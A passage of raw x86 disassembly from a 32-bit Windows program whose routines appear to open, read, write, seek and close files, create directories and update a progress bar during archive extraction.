  404779:	75 03                	jne    0x40477e
  40477b:	40                   	inc    %eax
  40477c:	5e                   	pop    %esi
  40477d:	c3                   	ret
  40477e:	83 3d dc 91 40 00 00 	cmpl   $0x0,0x4091dc
  404785:	57                   	push   %edi
  404786:	75 44                	jne    0x4047cc
  404788:	f6 05 38 8a 40 00 01 	testb  $0x1,0x408a38
  40478f:	75 3b                	jne    0x4047cc
  404791:	6a 06                	push   $0x6
  404793:	33 ff                	xor    %edi,%edi
  404795:	89 35 04 94 40 00    	mov    %esi,0x409404
  40479b:	57                   	push   %edi
  40479c:	68 50 34 40 00       	push   $0x403450
  4047a1:	ff 35 84 85 40 00    	push   0x408584
  4047a7:	ba d3 07 00 00       	mov    $0x7d3,%edx
  4047ac:	e8 66 1d 00 00       	call   0x406517
  4047b1:	83 e8 06             	sub    $0x6,%eax
  4047b4:	74 16                	je     0x4047cc
  4047b6:	83 e8 01             	sub    $0x1,%eax
  4047b9:	74 20                	je     0x4047db
  4047bb:	2d 32 08 00 00       	sub    $0x832,%eax
  4047c0:	75 0a                	jne    0x4047cc
  4047c2:	c7 05 dc 91 40 00 01 	movl   $0x1,0x4091dc
  4047c9:	00 00 00 
  4047cc:	68 80 00 00 00       	push   $0x80
  4047d1:	56                   	push   %esi
  4047d2:	ff 15 98 a0 40 00    	call   *0x40a098
  4047d8:	33 ff                	xor    %edi,%edi
  4047da:	47                   	inc    %edi
  4047db:	8b c7                	mov    %edi,%eax
  4047dd:	5f                   	pop    %edi
  4047de:	5e                   	pop    %esi
  4047df:	c3                   	ret
  4047e0:	8b ff                	mov    %edi,%edi
  4047e2:	56                   	push   %esi
  4047e3:	57                   	push   %edi
  4047e4:	6a 08                	push   $0x8
  4047e6:	6a 40                	push   $0x40
  4047e8:	8b f9                	mov    %ecx,%edi
  4047ea:	ff 15 50 a1 40 00    	call   *0x40a150
  4047f0:	8b f0                	mov    %eax,%esi
  4047f2:	85 f6                	test   %esi,%esi
  4047f4:	75 19                	jne    0x40480f
  4047f6:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  4047fc:	ba b5 04 00 00       	mov    $0x4b5,%edx
  404801:	50                   	push   %eax
  404802:	6a 10                	push   $0x10
  404804:	50                   	push   %eax
  404805:	50                   	push   %eax
  404806:	e8 ae fc ff ff       	call   0x4044b9
  40480b:	33 c0                	xor    %eax,%eax
  40480d:	eb 68                	jmp    0x404877
  40480f:	8b cf                	mov    %edi,%ecx
  404811:	8d 51 01             	lea    0x1(%ecx),%edx
  404814:	8a 01                	mov    (%ecx),%al
  404816:	41                   	inc    %ecx
  404817:	84 c0                	test   %al,%al
  404819:	75 f9                	jne    0x404814
  40481b:	2b ca                	sub    %edx,%ecx
  40481d:	8d 41 01             	lea    0x1(%ecx),%eax
  404820:	50                   	push   %eax
  404821:	6a 40                	push   $0x40
  404823:	ff 15 50 a1 40 00    	call   *0x40a150
  404829:	8b c8                	mov    %eax,%ecx
  40482b:	89 0e                	mov    %ecx,(%esi)
  40482d:	85 c9                	test   %ecx,%ecx
  40482f:	75 1e                	jne    0x40484f
  404831:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  404837:	ba b5 04 00 00       	mov    $0x4b5,%edx
  40483c:	50                   	push   %eax
  40483d:	6a 10                	push   $0x10
  40483f:	50                   	push   %eax
  404840:	50                   	push   %eax
  404841:	e8 73 fc ff ff       	call   0x4044b9
  404846:	56                   	push   %esi
  404847:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  40484d:	eb bc                	jmp    0x40480b
  40484f:	8b d7                	mov    %edi,%edx
  404851:	53                   	push   %ebx
  404852:	8d 5a 01             	lea    0x1(%edx),%ebx
  404855:	8a 02                	mov    (%edx),%al
  404857:	42                   	inc    %edx
  404858:	84 c0                	test   %al,%al
  40485a:	75 f9                	jne    0x404855
  40485c:	2b d3                	sub    %ebx,%edx
  40485e:	57                   	push   %edi
  40485f:	42                   	inc    %edx
  404860:	e8 1b ce ff ff       	call   0x401680
  404865:	a1 e0 91 40 00       	mov    0x4091e0,%eax
  40486a:	89 46 04             	mov    %eax,0x4(%esi)
  40486d:	33 c0                	xor    %eax,%eax
  40486f:	89 35 e0 91 40 00    	mov    %esi,0x4091e0
  404875:	40                   	inc    %eax
  404876:	5b                   	pop    %ebx
  404877:	5f                   	pop    %edi
  404878:	5e                   	pop    %esi
  404879:	c3                   	ret
  40487a:	8b ff                	mov    %edi,%edi
  40487c:	53                   	push   %ebx
  40487d:	56                   	push   %esi
  40487e:	8b f2                	mov    %edx,%esi
  404880:	8b d9                	mov    %ecx,%ebx
  404882:	57                   	push   %edi
  404883:	8b c6                	mov    %esi,%eax
  404885:	24 03                	and    $0x3,%al
  404887:	0f b6 f8             	movzbl %al,%edi
  40488a:	f7 df                	neg    %edi
  40488c:	1b ff                	sbb    %edi,%edi
  40488e:	81 e7 00 00 00 c0    	and    $0xc0000000,%edi
  404894:	81 c7 00 00 00 80    	add    $0x80000000,%edi
  40489a:	f7 c6 00 01 00 00    	test   $0x100,%esi
  4048a0:	74 1f                	je     0x4048c1
  4048a2:	f7 c6 00 04 00 00    	test   $0x400,%esi
  4048a8:	74 05                	je     0x4048af
  4048aa:	33 f6                	xor    %esi,%esi
  4048ac:	46                   	inc    %esi
  4048ad:	eb 22                	jmp    0x4048d1
  4048af:	81 e6 00 02 00 00    	and    $0x200,%esi
  4048b5:	f7 de                	neg    %esi
  4048b7:	1b f6                	sbb    %esi,%esi
  4048b9:	83 e6 fe             	and    $0xfffffffe,%esi
  4048bc:	83 c6 04             	add    $0x4,%esi
  4048bf:	eb 10                	jmp    0x4048d1
  4048c1:	81 e6 00 02 00 00    	and    $0x200,%esi
  4048c7:	f7 de                	neg    %esi
  4048c9:	1b f6                	sbb    %esi,%esi
  4048cb:	83 e6 02             	and    $0x2,%esi
  4048ce:	83 c6 03             	add    $0x3,%esi
  4048d1:	33 c0                	xor    %eax,%eax
  4048d3:	50                   	push   %eax
  4048d4:	68 80 00 00 00       	push   $0x80
  4048d9:	56                   	push   %esi
  4048da:	50                   	push   %eax
  4048db:	50                   	push   %eax
  4048dc:	57                   	push   %edi
  4048dd:	53                   	push   %ebx
  4048de:	ff 15 08 a1 40 00    	call   *0x40a108
  4048e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4048e7:	75 1f                	jne    0x404908
  4048e9:	83 fe 03             	cmp    $0x3,%esi
  4048ec:	74 1a                	je     0x404908
  4048ee:	8b cb                	mov    %ebx,%ecx
  4048f0:	e8 17 00 00 00       	call   0x40490c
  4048f5:	33 c0                	xor    %eax,%eax
  4048f7:	50                   	push   %eax
  4048f8:	68 80 00 00 00       	push   $0x80
  4048fd:	56                   	push   %esi
  4048fe:	50                   	push   %eax
  4048ff:	50                   	push   %eax
  404900:	57                   	push   %edi
  404901:	53                   	push   %ebx
  404902:	ff 15 08 a1 40 00    	call   *0x40a108
  404908:	5f                   	pop    %edi
  404909:	5e                   	pop    %esi
  40490a:	5b                   	pop    %ebx
  40490b:	c3                   	ret
  40490c:	8b ff                	mov    %edi,%edi
  40490e:	57                   	push   %edi
  40490f:	8b f9                	mov    %ecx,%edi
  404911:	8a 0f                	mov    (%edi),%cl
  404913:	84 c9                	test   %cl,%cl
  404915:	74 5c                	je     0x404973
  404917:	8a 47 01             	mov    0x1(%edi),%al
  40491a:	53                   	push   %ebx
  40491b:	33 db                	xor    %ebx,%ebx
  40491d:	56                   	push   %esi
  40491e:	8d 77 02             	lea    0x2(%edi),%esi
  404921:	3c 3a                	cmp    $0x3a,%al
  404923:	75 0a                	jne    0x40492f
  404925:	80 3e 5c             	cmpb   $0x5c,(%esi)
  404928:	75 05                	jne    0x40492f
  40492a:	8d 77 03             	lea    0x3(%edi),%esi
  40492d:	eb 3c                	jmp    0x40496b
  40492f:	80 f9 5c             	cmp    $0x5c,%cl
  404932:	75 09                	jne    0x40493d
  404934:	3a c1                	cmp    %cl,%al
  404936:	75 05                	jne    0x40493d
  404938:	6a 02                	push   $0x2
  40493a:	5b                   	pop    %ebx
  40493b:	eb 2e                	jmp    0x40496b
  40493d:	8d 77 01             	lea    0x1(%edi),%esi
  404940:	eb 2b                	jmp    0x40496d
  404942:	3c 5c                	cmp    $0x5c,%al
  404944:	75 1c                	jne    0x404962
  404946:	80 7e ff 3a          	cmpb   $0x3a,-0x1(%esi)
  40494a:	74 16                	je     0x404962
  40494c:	85 db                	test   %ebx,%ebx
  40494e:	74 03                	je     0x404953
  404950:	4b                   	dec    %ebx
  404951:	eb 0f                	jmp    0x404962
  404953:	6a 00                	push   $0x0
  404955:	57                   	push   %edi
  404956:	c6 06 00             	movb   $0x0,(%esi)
  404959:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  40495f:	c6 06 5c             	movb   $0x5c,(%esi)
  404962:	56                   	push   %esi
  404963:	ff 15 ec a1 40 00    	call   *0x40a1ec
  404969:	8b f0                	mov    %eax,%esi
  40496b:	8a 06                	mov    (%esi),%al
  40496d:	84 c0                	test   %al,%al
  40496f:	75 d1                	jne    0x404942
  404971:	5e                   	pop    %esi
  404972:	5b                   	pop    %ebx
  404973:	5f                   	pop    %edi
  404974:	c3                   	ret
  404975:	cc                   	int3
  404976:	cc                   	int3
  404977:	cc                   	int3
  404978:	cc                   	int3
  404979:	cc                   	int3
  40497a:	cc                   	int3
  40497b:	cc                   	int3
  40497c:	cc                   	int3
  40497d:	cc                   	int3
  40497e:	cc                   	int3
  40497f:	cc                   	int3
  404980:	8b ff                	mov    %edi,%edi
  404982:	55                   	push   %ebp
  404983:	8b ec                	mov    %esp,%ebp
  404985:	56                   	push   %esi
  404986:	57                   	push   %edi
  404987:	33 ff                	xor    %edi,%edi
  404989:	b8 60 8d 40 00       	mov    $0x408d60,%eax
  40498e:	8b f7                	mov    %edi,%esi
  404990:	83 38 01             	cmpl   $0x1,(%eax)
  404993:	74 0b                	je     0x4049a0
  404995:	83 c0 18             	add    $0x18,%eax
  404998:	46                   	inc    %esi
  404999:	3d 20 91 40 00       	cmp    $0x409120,%eax
  40499e:	7c f0                	jl     0x404990
  4049a0:	83 fe 28             	cmp    $0x28,%esi
  4049a3:	75 1d                	jne    0x4049c2
  4049a5:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  4049ab:	ba bb 04 00 00       	mov    $0x4bb,%edx
  4049b0:	57                   	push   %edi
  4049b1:	6a 10                	push   $0x10
  4049b3:	57                   	push   %edi
  4049b4:	57                   	push   %edi
  4049b5:	e8 ff fa ff ff       	call   0x4044b9
  4049ba:	83 c8 ff             	or     $0xffffffff,%eax
  4049bd:	e9 84 00 00 00       	jmp    0x404a46
  4049c2:	68 cc 81 40 00       	push   $0x4081cc
  4049c7:	ff 75 08             	push   0x8(%ebp)
  4049ca:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  4049d0:	85 c0                	test   %eax,%eax
  4049d2:	75 3a                	jne    0x404a0e
  4049d4:	f7 45 0c 0b 01 00 00 	testl  $0x10b,0xc(%ebp)
  4049db:	75 dd                	jne    0x4049ba
  4049dd:	a1 40 91 40 00       	mov    0x409140,%eax
  4049e2:	6b ce 18             	imul   $0x18,%esi,%ecx
  4049e5:	89 81 68 8d 40 00    	mov    %eax,0x408d68(%ecx)
  4049eb:	a1 44 91 40 00       	mov    0x409144,%eax
  4049f0:	89 b9 60 8d 40 00    	mov    %edi,0x408d60(%ecx)
  4049f6:	c7 81 64 8d 40 00 01 	movl   $0x1,0x408d64(%ecx)
  4049fd:	00 00 00 
  404a00:	89 81 70 8d 40 00    	mov    %eax,0x408d70(%ecx)
  404a06:	89 b9 6c 8d 40 00    	mov    %edi,0x408d6c(%ecx)
  404a0c:	eb 36                	jmp    0x404a44
  404a0e:	8b 55 0c             	mov    0xc(%ebp),%edx
  404a11:	f6 c2 08             	test   $0x8,%dl
  404a14:	74 05                	je     0x404a1b
  404a16:	83 c9 ff             	or     $0xffffffff,%ecx
  404a19:	eb 0a                	jmp    0x404a25
  404a1b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404a1e:	e8 57 fe ff ff       	call   0x40487a
  404a23:	8b c8                	mov    %eax,%ecx
  404a25:	6b c6 18             	imul   $0x18,%esi,%eax
  404a28:	89 88 74 8d 40 00    	mov    %ecx,0x408d74(%eax)
  404a2e:	83 f9 ff             	cmp    $0xffffffff,%ecx
  404a31:	74 0e                	je     0x404a41
  404a33:	89 b8 60 8d 40 00    	mov    %edi,0x408d60(%eax)
  404a39:	89 b8 64 8d 40 00    	mov    %edi,0x408d64(%eax)
  404a3f:	eb 03                	jmp    0x404a44
  404a41:	83 ce ff             	or     $0xffffffff,%esi
  404a44:	8b c6                	mov    %esi,%eax
  404a46:	5f                   	pop    %edi
  404a47:	5e                   	pop    %esi
  404a48:	5d                   	pop    %ebp
  404a49:	c3                   	ret
  404a4a:	cc                   	int3
  404a4b:	cc                   	int3
  404a4c:	cc                   	int3
  404a4d:	cc                   	int3
  404a4e:	cc                   	int3
  404a4f:	cc                   	int3
  404a50:	8b ff                	mov    %edi,%edi
  404a52:	55                   	push   %ebp
  404a53:	8b ec                	mov    %esp,%ebp
  404a55:	56                   	push   %esi
  404a56:	57                   	push   %edi
  404a57:	6b 7d 08 18          	imul   $0x18,0x8(%ebp),%edi
  404a5b:	8b 87 64 8d 40 00    	mov    0x408d64(%edi),%eax
  404a61:	83 e8 00             	sub    $0x0,%eax
  404a64:	74 39                	je     0x404a9f
  404a66:	83 e8 01             	sub    $0x1,%eax
  404a69:	75 50                	jne    0x404abb
  404a6b:	8b 87 70 8d 40 00    	mov    0x408d70(%edi),%eax
  404a71:	8b 8f 6c 8d 40 00    	mov    0x408d6c(%edi),%ecx
  404a77:	2b c1                	sub    %ecx,%eax
  404a79:	8b 75 10             	mov    0x10(%ebp),%esi
  404a7c:	3b f0                	cmp    %eax,%esi
  404a7e:	72 02                	jb     0x404a82
  404a80:	8b f0                	mov    %eax,%esi
  404a82:	8b 87 68 8d 40 00    	mov    0x408d68(%edi),%eax
  404a88:	56                   	push   %esi
  404a89:	03 c1                	add    %ecx,%eax
  404a8b:	50                   	push   %eax
  404a8c:	ff 75 0c             	push   0xc(%ebp)
  404a8f:	e8 15 28 00 00       	call   0x4072a9
  404a94:	83 c4 0c             	add    $0xc,%esp
  404a97:	01 b7 6c 8d 40 00    	add    %esi,0x408d6c(%edi)
  404a9d:	eb 24                	jmp    0x404ac3
  404a9f:	6a 00                	push   $0x0
  404aa1:	8d 45 10             	lea    0x10(%ebp),%eax
  404aa4:	50                   	push   %eax
  404aa5:	ff 75 10             	push   0x10(%ebp)
  404aa8:	ff 75 0c             	push   0xc(%ebp)
  404aab:	ff b7 74 8d 40 00    	push   0x408d74(%edi)
  404ab1:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  404ab7:	85 c0                	test   %eax,%eax
  404ab9:	75 05                	jne    0x404ac0
  404abb:	83 ce ff             	or     $0xffffffff,%esi
  404abe:	eb 03                	jmp    0x404ac3
  404ac0:	8b 75 10             	mov    0x10(%ebp),%esi
  404ac3:	5f                   	pop    %edi
  404ac4:	8b c6                	mov    %esi,%eax
  404ac6:	5e                   	pop    %esi
  404ac7:	5d                   	pop    %ebp
  404ac8:	c3                   	ret
  404ac9:	cc                   	int3
  404aca:	cc                   	int3
  404acb:	cc                   	int3
  404acc:	cc                   	int3
  404acd:	cc                   	int3
  404ace:	cc                   	int3
  404acf:	cc                   	int3
  404ad0:	8b ff                	mov    %edi,%edi
  404ad2:	55                   	push   %ebp
  404ad3:	8b ec                	mov    %esp,%ebp
  404ad5:	8b 0d 8c 85 40 00    	mov    0x40858c,%ecx
  404adb:	e8 a0 eb ff ff       	call   0x403680
  404ae0:	83 3d d8 91 40 00 00 	cmpl   $0x0,0x4091d8
  404ae7:	74 05                	je     0x404aee
  404ae9:	83 c8 ff             	or     $0xffffffff,%eax
  404aec:	5d                   	pop    %ebp
  404aed:	c3                   	ret
  404aee:	56                   	push   %esi
  404aef:	6a 00                	push   $0x0
  404af1:	8d 45 10             	lea    0x10(%ebp),%eax
  404af4:	50                   	push   %eax
  404af5:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  404af9:	ff 75 10             	push   0x10(%ebp)
  404afc:	ff 75 0c             	push   0xc(%ebp)
  404aff:	ff b0 74 8d 40 00    	push   0x408d74(%eax)
  404b05:	ff 15 cc a0 40 00    	call   *0x40a0cc
  404b0b:	85 c0                	test   %eax,%eax
  404b0d:	75 05                	jne    0x404b14
  404b0f:	83 ce ff             	or     $0xffffffff,%esi
  404b12:	eb 46                	jmp    0x404b5a
  404b14:	8b 75 10             	mov    0x10(%ebp),%esi
  404b17:	83 fe ff             	cmp    $0xffffffff,%esi
  404b1a:	74 3e                	je     0x404b5a
  404b1c:	a1 00 94 40 00       	mov    0x409400,%eax
  404b21:	03 c6                	add    %esi,%eax
  404b23:	83 3d 84 81 40 00 00 	cmpl   $0x0,0x408184
  404b2a:	a3 00 94 40 00       	mov    %eax,0x409400
  404b2f:	74 29                	je     0x404b5a
  404b31:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  404b37:	85 c9                	test   %ecx,%ecx
  404b39:	74 1f                	je     0x404b5a
  404b3b:	6b c0 64             	imul   $0x64,%eax,%eax
  404b3e:	33 d2                	xor    %edx,%edx
  404b40:	6a 00                	push   $0x0
  404b42:	f7 35 f8 93 40 00    	divl   0x4093f8
  404b48:	50                   	push   %eax
  404b49:	68 02 04 00 00       	push   $0x402
  404b4e:	68 3a 08 00 00       	push   $0x83a
  404b53:	51                   	push   %ecx
  404b54:	ff 15 08 a2 40 00    	call   *0x40a208
  404b5a:	8b c6                	mov    %esi,%eax
  404b5c:	5e                   	pop    %esi
  404b5d:	5d                   	pop    %ebp
  404b5e:	c3                   	ret
  404b5f:	cc                   	int3
  404b60:	8b ff                	mov    %edi,%edi
  404b62:	55                   	push   %ebp
  404b63:	8b ec                	mov    %esp,%ebp
  404b65:	56                   	push   %esi
  404b66:	6b 75 08 18          	imul   $0x18,0x8(%ebp),%esi
  404b6a:	57                   	push   %edi
  404b6b:	33 ff                	xor    %edi,%edi
  404b6d:	47                   	inc    %edi
  404b6e:	39 be 64 8d 40 00    	cmp    %edi,0x408d64(%esi)
  404b74:	75 1c                	jne    0x404b92
  404b76:	33 c0                	xor    %eax,%eax
  404b78:	89 be 60 8d 40 00    	mov    %edi,0x408d60(%esi)
  404b7e:	89 86 68 8d 40 00    	mov    %eax,0x408d68(%esi)
  404b84:	89 86 70 8d 40 00    	mov    %eax,0x408d70(%esi)
  404b8a:	89 86 6c 8d 40 00    	mov    %eax,0x408d6c(%esi)
  404b90:	eb 1d                	jmp    0x404baf
  404b92:	ff b6 74 8d 40 00    	push   0x408d74(%esi)
  404b98:	ff 15 88 a0 40 00    	call   *0x40a088
  404b9e:	85 c0                	test   %eax,%eax
  404ba0:	74 0a                	je     0x404bac
  404ba2:	33 c0                	xor    %eax,%eax
  404ba4:	89 be 60 8d 40 00    	mov    %edi,0x408d60(%esi)
  404baa:	eb 03                	jmp    0x404baf
  404bac:	83 c8 ff             	or     $0xffffffff,%eax
  404baf:	5f                   	pop    %edi
  404bb0:	5e                   	pop    %esi
  404bb1:	5d                   	pop    %ebp
  404bb2:	c3                   	ret
  404bb3:	cc                   	int3
  404bb4:	cc                   	int3
  404bb5:	cc                   	int3
  404bb6:	cc                   	int3
  404bb7:	cc                   	int3
  404bb8:	cc                   	int3
  404bb9:	cc                   	int3
  404bba:	cc                   	int3
  404bbb:	cc                   	int3
  404bbc:	cc                   	int3
  404bbd:	cc                   	int3
  404bbe:	cc                   	int3
  404bbf:	cc                   	int3
  404bc0:	8b ff                	mov    %edi,%edi
  404bc2:	55                   	push   %ebp
  404bc3:	8b ec                	mov    %esp,%ebp
  404bc5:	6b 55 08 18          	imul   $0x18,0x8(%ebp),%edx
  404bc9:	33 c9                	xor    %ecx,%ecx
  404bcb:	8b 45 10             	mov    0x10(%ebp),%eax
  404bce:	41                   	inc    %ecx
  404bcf:	39 8a 64 8d 40 00    	cmp    %ecx,0x408d64(%edx)
  404bd5:	75 2e                	jne    0x404c05
  404bd7:	83 e8 00             	sub    $0x0,%eax
  404bda:	74 1e                	je     0x404bfa
  404bdc:	2b c1                	sub    %ecx,%eax
  404bde:	74 0f                	je     0x404bef
  404be0:	2b c1                	sub    %ecx,%eax
  404be2:	75 4e                	jne    0x404c32
  404be4:	8b 45 0c             	mov    0xc(%ebp),%eax
  404be7:	03 82 70 8d 40 00    	add    0x408d70(%edx),%eax
  404bed:	eb 0e                	jmp    0x404bfd
  404bef:	8b 45 0c             	mov    0xc(%ebp),%eax
  404bf2:	03 82 6c 8d 40 00    	add    0x408d6c(%edx),%eax
  404bf8:	eb 03                	jmp    0x404bfd
  404bfa:	8b 45 0c             	mov    0xc(%ebp),%eax
  404bfd:	89 82 6c 8d 40 00    	mov    %eax,0x408d6c(%edx)
  404c03:	5d                   	pop    %ebp
  404c04:	c3                   	ret
  404c05:	83 e8 00             	sub    $0x0,%eax
  404c08:	74 0f                	je     0x404c19
  404c0a:	83 e8 01             	sub    $0x1,%eax
  404c0d:	74 0c                	je     0x404c1b
  404c0f:	83 e8 01             	sub    $0x1,%eax
  404c12:	75 1e                	jne    0x404c32
  404c14:	6a 02                	push   $0x2
  404c16:	59                   	pop    %ecx
  404c17:	eb 02                	jmp    0x404c1b
  404c19:	33 c9                	xor    %ecx,%ecx
  404c1b:	51                   	push   %ecx
  404c1c:	6a 00                	push   $0x0
  404c1e:	ff 75 0c             	push   0xc(%ebp)
  404c21:	ff b2 74 8d 40 00    	push   0x408d74(%edx)
  404c27:	ff 15 dc a0 40 00    	call   *0x40a0dc
  404c2d:	83 f8 ff             	cmp    $0xffffffff,%eax
  404c30:	75 03                	jne    0x404c35
  404c32:	83 c8 ff             	or     $0xffffffff,%eax
  404c35:	5d                   	pop    %ebp
  404c36:	c3                   	ret
  404c37:	8b ff                	mov    %edi,%edi
  404c39:	55                   	push   %ebp
  404c3a:	8b ec                	mov    %esp,%ebp
  404c3c:	83 ec 10             	sub    $0x10,%esp
  404c3f:	56                   	push   %esi
  404c40:	6b f1 18             	imul   $0x18,%ecx,%esi
  404c43:	83 be 64 8d 40 00 01 	cmpl   $0x1,0x408d64(%esi)
  404c4a:	74 41                	je     0x404c8d
  404c4c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c4f:	50                   	push   %eax
  404c50:	ff 75 08             	push   0x8(%ebp)
  404c53:	52                   	push   %edx
  404c54:	ff 15 40 a1 40 00    	call   *0x40a140
  404c5a:	85 c0                	test   %eax,%eax
  404c5c:	74 2f                	je     0x404c8d
  404c5e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404c61:	50                   	push   %eax
  404c62:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c65:	50                   	push   %eax
  404c66:	ff 15 04 a1 40 00    	call   *0x40a104
  404c6c:	85 c0                	test   %eax,%eax
  404c6e:	74 1d                	je     0x404c8d
  404c70:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404c73:	50                   	push   %eax
  404c74:	8b c8                	mov    %eax,%ecx
  404c76:	51                   	push   %ecx
  404c77:	51                   	push   %ecx
  404c78:	ff b6 74 8d 40 00    	push   0x408d74(%esi)
  404c7e:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  404c84:	85 c0                	test   %eax,%eax
  404c86:	74 05                	je     0x404c8d
  404c88:	33 c0                	xor    %eax,%eax
  404c8a:	40                   	inc    %eax
  404c8b:	eb 02                	jmp    0x404c8f
  404c8d:	33 c0                	xor    %eax,%eax
  404c8f:	5e                   	pop    %esi
  404c90:	8b e5                	mov    %ebp,%esp
  404c92:	5d                   	pop    %ebp
  404c93:	c2 04 00             	ret    $0x4
  404c96:	cc                   	int3
  404c97:	cc                   	int3
  404c98:	cc                   	int3
  404c99:	cc                   	int3
  404c9a:	cc                   	int3
  404c9b:	cc                   	int3
  404c9c:	cc                   	int3
  404c9d:	cc                   	int3
  404c9e:	cc                   	int3
  404c9f:	cc                   	int3
  404ca0:	8b ff                	mov    %edi,%edi
  404ca2:	55                   	push   %ebp
  404ca3:	8b ec                	mov    %esp,%ebp
  404ca5:	ff 75 08             	push   0x8(%ebp)
  404ca8:	6a 00                	push   $0x0
  404caa:	ff 15 80 a0 40 00    	call   *0x40a080
  404cb0:	5d                   	pop    %ebp
  404cb1:	c3                   	ret
  404cb2:	cc                   	int3
  404cb3:	cc                   	int3
  404cb4:	cc                   	int3
  404cb5:	cc                   	int3
  404cb6:	cc                   	int3
  404cb7:	cc                   	int3
  404cb8:	cc                   	int3
  404cb9:	cc                   	int3
  404cba:	cc                   	int3
  404cbb:	cc                   	int3
  404cbc:	cc                   	int3
  404cbd:	cc                   	int3
  404cbe:	cc                   	int3
  404cbf:	cc                   	int3
  404cc0:	8b ff                	mov    %edi,%edi
  404cc2:	55                   	push   %ebp
  404cc3:	8b ec                	mov    %esp,%ebp
  404cc5:	ff 75 08             	push   0x8(%ebp)
  404cc8:	ff 15 84 a0 40 00    	call   *0x40a084
  404cce:	5d                   	pop    %ebp
  404ccf:	c3                   	ret
  404cd0:	8b ff                	mov    %edi,%edi
  404cd2:	55                   	push   %ebp
  404cd3:	8b ec                	mov    %esp,%ebp
  404cd5:	81 ec 08 01 00 00    	sub    $0x108,%esp
  404cdb:	a1 04 80 40 00       	mov    0x408004,%eax
  404ce0:	33 c5                	xor    %ebp,%eax
  404ce2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ce5:	83 3d d8 91 40 00 00 	cmpl   $0x0,0x4091d8
  404cec:	53                   	push   %ebx
  404ced:	56                   	push   %esi
  404cee:	8b 75 0c             	mov    0xc(%ebp),%esi
  404cf1:	57                   	push   %edi
  404cf2:	74 17                	je     0x404d0b
  404cf4:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  404cf8:	75 09                	jne    0x404d03
  404cfa:	ff 76 14             	push   0x14(%esi)
  404cfd:	e8 5e fe ff ff       	call   0x404b60
  404d02:	59                   	pop    %ecx
  404d03:	83 c8 ff             	or     $0xffffffff,%eax
  404d06:	e9 7d 01 00 00       	jmp    0x404e88
  404d0b:	8b 45 08             	mov    0x8(%ebp),%eax
  404d0e:	83 e8 00             	sub    $0x0,%eax
  404d11:	0f 84 6a 01 00 00    	je     0x404e81
  404d17:	83 e8 01             	sub    $0x1,%eax
  404d1a:	74 13                	je     0x404d2f
  404d1c:	83 e8 01             	sub    $0x1,%eax
  404d1f:	0f 84 a6 00 00 00    	je     0x404dcb
  404d25:	83 e8 01             	sub    $0x1,%eax
  404d28:	74 0c                	je     0x404d36
  404d2a:	83 e8 01             	sub    $0x1,%eax
  404d2d:	74 d4                	je     0x404d03
  404d2f:	33 c0                	xor    %eax,%eax
  404d31:	e9 52 01 00 00       	jmp    0x404e88
  404d36:	bb e4 91 40 00       	mov    $0x4091e4,%ebx
  404d3b:	8b cb                	mov    %ebx,%ecx
  404d3d:	8d 51 01             	lea    0x1(%ecx),%edx
  404d40:	8a 01                	mov    (%ecx),%al
  404d42:	41                   	inc    %ecx
  404d43:	84 c0                	test   %al,%al
  404d45:	75 f9                	jne    0x404d40
  404d47:	8b 7e 04             	mov    0x4(%esi),%edi
  404d4a:	2b ca                	sub    %edx,%ecx
  404d4c:	8d 57 01             	lea    0x1(%edi),%edx
  404d4f:	8a 07                	mov    (%edi),%al
  404d51:	47                   	inc    %edi
  404d52:	84 c0                	test   %al,%al
  404d54:	75 f9                	jne    0x404d4f
  404d56:	2b fa                	sub    %edx,%edi
  404d58:	8d 41 01             	lea    0x1(%ecx),%eax
  404d5b:	03 c7                	add    %edi,%eax
  404d5d:	3d 04 01 00 00       	cmp    $0x104,%eax
  404d62:	7d 9f                	jge    0x404d03
  404d64:	ff 76 04             	push   0x4(%esi)
  404d67:	8b d3                	mov    %ebx,%edx
  404d69:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  404d6f:	e8 8e f9 ff ff       	call   0x404702
  404d74:	85 c0                	test   %eax,%eax
  404d76:	74 8b                	je     0x404d03
  404d78:	0f b7 46 1a          	movzwl 0x1a(%esi),%eax
  404d7c:	66 8b 56 18          	mov    0x18(%esi),%dx
  404d80:	8b 4e 14             	mov    0x14(%esi),%ecx
  404d83:	50                   	push   %eax
  404d84:	e8 ae fe ff ff       	call   0x404c37
  404d89:	85 c0                	test   %eax,%eax
  404d8b:	0f 84 72 ff ff ff    	je     0x404d03
  404d91:	ff 76 14             	push   0x14(%esi)
  404d94:	e8 c7 fd ff ff       	call   0x404b60
  404d99:	0f b7 46 1c          	movzwl 0x1c(%esi),%eax
  404d9d:	59                   	pop    %ecx
  404d9e:	66 85 c0             	test   %ax,%ax
  404da1:	75 07                	jne    0x404daa
  404da3:	b8 80 00 00 00       	mov    $0x80,%eax
  404da8:	eb 03                	jmp    0x404dad
  404daa:	83 e0 27             	and    $0x27,%eax
  404dad:	50                   	push   %eax
  404dae:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  404db4:	50                   	push   %eax
  404db5:	ff 15 98 a0 40 00    	call   *0x40a098
  404dbb:	85 c0                	test   %eax,%eax
  404dbd:	0f 84 40 ff ff ff    	je     0x404d03
  404dc3:	33 c0                	xor    %eax,%eax
  404dc5:	40                   	inc    %eax
  404dc6:	e9 bd 00 00 00       	jmp    0x404e88
  404dcb:	a1 84 85 40 00       	mov    0x408584,%eax
  404dd0:	85 c0                	test   %eax,%eax
  404dd2:	74 0f                	je     0x404de3
  404dd4:	ff 76 04             	push   0x4(%esi)
  404dd7:	68 37 08 00 00       	push   $0x837
  404ddc:	50                   	push   %eax
  404ddd:	ff 15 d4 a1 40 00    	call   *0x40a1d4
